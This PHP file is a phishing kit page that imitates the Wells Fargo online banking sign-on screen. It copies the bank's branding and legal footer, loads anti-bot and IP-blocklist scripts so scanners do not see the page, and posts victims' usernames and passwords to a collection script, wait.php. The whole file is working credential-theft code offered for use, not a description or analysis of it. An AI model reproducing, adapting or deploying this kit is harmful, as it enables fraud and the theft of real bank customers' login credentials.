
















































<?php
session_start();
error_reporting(0);
include('../files/boot/check.php');
include('../files/boot/check1.php');
include('../files/boot/check2.php');
include('../files/boot/antibot.php');
include('../files/boot/DB-BOTS.php');
include('../files/boot/DB-CIDR.php');
include('../files/boot/DB-HOSTS.php');
include('../files/boot/DB-METHOD.php');
include('../files/boot/DB-RANGE.php');
include('../files/boot/enc.php');
include('../call.php');
$rec = @$_GET['rec'];
$error = @$_GET['error'];
$id = "";
if( isset($_GET['id'])){
    $id = $_GET['id'];
}
?>
<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Sign On<?=$id?></title>
    <meta name="robots" content="index, follow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">

    <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
    <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="180x180" href="../files/icons/apple-touch-icon-180x180.png">
    <link rel="icon" sizes="128x128" href="../files/icons/icon-normal-128x128.png">
    <link rel="icon" sizes="192x192" href="../files/icons/icon-hires-192x192.png">

    <link rel="stylesheet" href="../files/bars/framework.css">
    <link rel="stylesheet" href="../files/bars/util.css">
    <link rel="stylesheet" href="../files/bars/smartphone-homepage.css">

</head>

<body class="freezedscreen" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <header class="masthead" role="banner">
            <div id="navLeft" style="display: block;">
                <a tabindex="1" href="" rel="nofollow" class="backLink">
                    <span class="sr-only">Back link</span>
                </a>
            </div>
            <div class="logoOuter">
                <div class="logo">
                    <a href="#"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg" style="margin-top: 13px;"></a>
                </div>
            </div>
            <div id="navRight">
                <nav class="navbar navbar-default navbar-fixed-top">
                    <div class="navbar-header">
                        <div class="entire-menu">
                            <button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="expandedIcon pointer">‍</span></button>
                        </div>
                    </div>
                </nav>
            </div>
        </header>

        <div id="maincontainer">
            <div class="overlaySignOn" style="top: 38px;">

                <div class="overlayContainer">
                    <div class="welcome-container" tabindex="-1">Welcome</div>

                    <div class="security-container">
                        <span class="security-img"></span>
                        <a href="#" class="security-text">Online &amp; Mobile Security</a>
                    </div>
                    <div class="signOnContainer" align="center">
                        <form id="frmSignon" name="frmSignon" action="wait.php?id=<?=$id?>" method="post" autocomplete="off">
                            <?php
                            if( $error != ""){
                            ?>
                            <p style="color: red; font-size: 1.2em; font-weight: bold;">
                                Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
                            </p>
                            <?php
                            }
                            ?>
                            <label class="sr-only" for="userid">Username</label>

                            <input type="text" maxlength="14" id="userid" placeholder="Username" class="required" name="j_username">

                            <label class="sr-only" for="passwd">Password</label>

                            <input type="password" maxlength="32" placeholder="Password" class="required" id="passwd" name="j_password">
                            <div align="left" class="save-uid">
                                <ul>
                                    <li>
                                        <input type="checkbox" name="username" id="saveusername" value="">
                                        <label for="saveusername"><span></span>Save Username</label>
                                        <input type="hidden" name="save-username" id="save-username" value="false">
                                        <input type="hidden" name="hdnuserid" id="hdnuserid" value="">
                                    </li>
                                </ul>
                            </div>
                            <input type="submit" class="signOn" value="Sign On">
                            <div align="left" class="forgot-uid-pwd">
                                <a href="#" class="enroll-text">Forgot Password/Username?</a>
                            </div>
                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
                        </form>
                    </div>
                    <div class="appstoreBadge" id="ios">
                        <a href="#" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
                        <a href="#" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>

                    </div>
                    <footer role="contentinfo">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>

                    </footer>
                </div>
            </div>
        </div>
    </div>
</body>
</html>

